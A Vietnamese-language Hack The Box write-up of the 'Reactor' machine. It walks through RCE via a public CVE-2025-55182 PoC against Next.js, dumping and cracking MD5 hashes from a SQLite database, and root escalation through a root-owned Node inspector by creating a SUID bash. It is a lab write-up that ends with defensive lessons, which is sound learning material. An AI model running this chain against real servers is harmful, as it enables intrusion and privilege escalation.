---
title: "Reactor Writeup - Hack The Box"
date: 2026-07-03 20:36:00 +0700
categories: [Hack The Box, Seasonal Machines]
tags:
  [
    hackthebox,
    reactor,
    nextjs,
    react-server-components,
    cve-2025-55182,
    sqlite,
    ssh,
    node-inspector,
  ]
---

> Machine: Reactor  
> Difficulty: Easy  
> OS: Linux  
> Tags: Next.js, React Server Components, CVE-2025-55182, SQLite, CrackStation, SSH, Node Inspector

![Reactor machine](/assets/img/20260703-reactor-htb-writeup/machine.png)

## Mở đầu

Trong bài này mình sẽ ghi lại quá trình làm machine **Reactor** trên Hack The Box. Hướng khai thác chính của box này là một web app Next.js bị dính CVE-2025-55182, sau đó mình đọc được SQLite database để lấy credential của user `engineer`, SSH vào server và leo quyền root thông qua một Node.js process đang bật debug inspector với quyền root.

## Recon

Đầu tiên mình scan Nmap:

<img src="{{ '/assets/img/20260703-reactor-htb-writeup/nmap_scan.png' | relative_url }}" alt="Nmap scan" width="501">

Kết quả có 2 port đáng chú ý:

```text
22/tcp   open  ssh
3000/tcp open  http
```

Port `22` là SSH, lúc này mình chưa có credential nên tạm thời bỏ qua. Port `3000` là web app.

Khi truy cập web, mình thấy đây là một dashboard có tên **ReactorWatch**:

![ReactorWatch UI](/assets/img/20260703-reactor-htb-writeup/ui_web.png)

Giao diện hiển thị các thông số như core status, core temp, pressure, coolant flow, turbine output và system logs.

## Phân tích JavaScript

Mình tải các file JavaScript của trang về để review:

![Download source files](/assets/img/20260703-reactor-htb-writeup/download_src.png)

Những file đáng chú ý:

```text
webpack-db0a529a99835594.js
main-app-4fbb4b1f318e39a0.js
517-d083b552e04dead1.js
4bd1b696-80bcaf75e1b4285e.js
```

Trong file 517-d083b552e04dead1.js, mình tìm thấy version Next.js:

```js
window.next = {
  version: "15.0.3",
  appDir: true,
};
```

Ngoài ra, bundle cũng lộ dấu hiệu React 19 RC:

```text
19.0.0-rc-66855b96-20241106
```

Và một số marker liên quan React Server Components:

```text
RSC
_rsc
Next-Action
createServerReference
callServer
```

Theo version tìm được thì có 2 CVE đáng chú ý:

```text
CVE-2025-29927  - Next.js middleware bypass
CVE-2025-55182  - React Server Components / Server Functions RCE
```

Trong 2 CVE này, **CVE-2025-55182** React2Shell khá nổi tiếng, target lại có đúng dấu hiệu của React Server Components, nên mình quyết định thử hướng này trước.

PoC mình dùng là repo:

```text
https://github.com/msanft/CVE-2025-55182/blob/main/poc.py
```

## Xác nhận RSC Endpoint

Mình test endpoint RSC bằng request:

```bash
curl -i \
  -H 'RSC: 1' \
  -H 'Accept: text/x-component' \
  'http://10.129.245.214:3000/?_rsc=1'
```

Response trả về:

```text
HTTP/1.1 200 OK
Content-Type: text/x-component
```

Đây là tín hiệu quan trọng, vì app thật sự có React Server Components endpoint.

## Initial Access - CVE-2025-55182

Mình dùng `poc.py` từ repo của `msanft`. Sau khi lưu PoC, mình chạy thử lệnh `id`:

```bash
python3 poc.py http://10.129.245.214:3000/ id
```

Kết quả:

```text
uid=999(node) gid=998(node) groups=998(node)
```

Như vậy là mình đã có RCE trên target, nhưng đang chạy với user `node`.

Một lưu ý nhỏ: nếu command có dấu cách thì cần quote lại:

```bash
python3 poc.py http://10.129.245.214:3000/ "ls -la /app"
```

Nếu không quote, PoC chỉ lấy argument đầu tiên sau URL, nên command có thể bị cắt sai.

## Đọc Database

Sau khi có RCE, mình liệt kê thư mục app và thấy file SQLite:

```text
/app/reactor.db
```

Mình dùng `sqlite3` để dump database:

![SQLite dump](/assets/img/20260703-reactor-htb-writeup/db_dump.png)

Schema có bảng `users`:

```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL,
    email TEXT
);
```

Dữ liệu trong bảng `users`:

```sql
INSERT INTO users VALUES(1,'admin','a203b22191d744a4e70ada5c101b17b8','administrator','admin@reactor.htb');
INSERT INTO users VALUES(2,'engineer','39d97110eafe2a9a68639812cd271e8e','operator','engineer@reactor.htb');
```

Hai hash này là 32 ký tự hex, khá giống MD5. Mình thử crack hash của `engineer` và `admin` bằng **CrackStation**:

![CrackStation result](/assets/img/20260703-reactor-htb-writeup/crack_pw.png)

Kết quả: Chỉ lấy được mật khẩu của `engineer`.

```text
39d97110eafe2a9a68639812cd271e8e : reactor1
```

Vậy credential có được:

```text
engineer:reactor1
```

## SSH và User Flag

Mình SSH vào target bằng user `engineer`:

```bash
ssh engineer@10.129.245.214
```

Sau khi login thành công, mình đọc user flag:

<img src="{{ '/assets/img/20260703-reactor-htb-writeup/user_flag.png' | relative_url }}" alt="User flag" width="482">

```bash
cat user.txt
```

Flag:

```text
<user_flag>
```

## Privilege Escalation

Sau khi vào user `engineer`, mình enum cơ bản:

```bash
id
```

Kết quả:

```text
uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)
```

Group `lxd` nhìn cũng đáng chú ý, nhưng khi thử `lxc image list` thì máy lại cố gắng cài LXD snap, nên mình không đi theo hướng đó.

Mình tiếp tục check process:

```bash
ps auxww
```

Và thấy một process rất đáng chú ý:

![Root Node inspector process](/assets/img/20260703-reactor-htb-writeup/check_process.png)

```text
root /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

Đây là Node.js process đang chạy bằng user `root`, và nó bật debug inspector tại `127.0.0.1:9229`.

Mình attach vào inspector:

```bash
node inspect 127.0.0.1:9229
```

Trong debugger, nếu gọi `require('child_process')` trực tiếp thì bị lỗi:

```text
ReferenceError: require is not defined
```

Lý do là context debugger không expose `require` trực tiếp. Mình dùng payload lấy lại object `process` thông qua constructor, sau đó gọi `child_process` từ `mainModule`.

Sau khi confirm command chạy với `uid=0(root)`, mình tạo SUID bash:

```text
copy /bin/bash ra /tmp/rootbash và chmod 4755
```

Sau đó thoát debugger và chạy:

```bash
/tmp/rootbash -p
```

Kết quả là shell có effective UID root:

```text
uid=1000(engineer) euid=0(root)
```

Cuối cùng mình đọc root flag:

![Root flag](/assets/img/20260703-reactor-htb-writeup/root_flag.png)

```bash
cat /root/root.txt
```

Flag:

```text
<root_flag>
```

## Vì sao Node Inspector leo được Root?

Vấn đề nằm ở process này:

```text
root /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

Node inspector cho phép client debug evaluate JavaScript trực tiếp trong runtime của process đang được debug. Vì process này đang chạy bằng `root`, code JavaScript mình evaluate cũng chạy trong context root.

Nói ngắn gọn: đây không phải Node tự leo quyền, mà là một service Node chạy bằng root lại mở cổng debug inspector cho local user attach vào. Khi attach được, mình có thể thực thi command hệ thống với quyền root.

## Tổng kết Attack Chain

Attack chain của mình:

```text
Nmap
-> Port 3000 chạy Next.js
-> Phân tích JS thấy Next.js 15.0.3 và React 19 RC
-> Xác định 2 CVE liên quan: CVE-2025-29927 và CVE-2025-55182
-> Chọn thử CVE-2025-55182 trước vì target có RSC markers và CVE này khá nổi tiếng
-> Dùng PoC msanft/CVE-2025-55182 lấy RCE với user node
-> Đọc /app/reactor.db
-> Lấy MD5 hash của engineer
-> Crack bằng CrackStation ra password reactor1
-> SSH vào engineer
-> Lấy user flag
-> Enum process và thấy Node inspector của root tại 127.0.0.1:9229
-> Attach debugger
-> Tạo SUID bash
-> Lấy root shell
-> Đọc root flag
```

## Bài học rút ra

Box này cho mình thấy việc fingerprint framework và version rất quan trọng. Chỉ từ Next.js `15.0.3`, React 19 RC và các marker RSC, mình có thể khoanh vùng được CVE-2025-55182 để thử nghiệm.

Phần sau của box cũng khá hay: credential nằm trong SQLite database với hash MD5 yếu, còn privilege escalation đến từ Node inspector bị bật trên production với quyền root. Đây là một misconfiguration nguy hiểm, vì debug inspector gần như cho phép RCE trong process đang debug.

Nếu triển khai production thì mình nghĩ nên tránh các lỗi sau:

- Không chạy service Node bằng root nếu không cần thiết.
- Không bật `--inspect` trên production.
- Không lưu password bằng MD5.
- Không để database chứa credential nằm trong app directory mà user web có thể đọc.

## Tham khảo

- [Critical Security Vulnerability in React Server Components](https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components)
- [Postmortem on Next.js Middleware bypass](https://nextjs.org/blog/cve-2025-29927)
- [msanft/CVE-2025-55182 PoC](https://github.com/msanft/CVE-2025-55182/blob/main/poc.py)
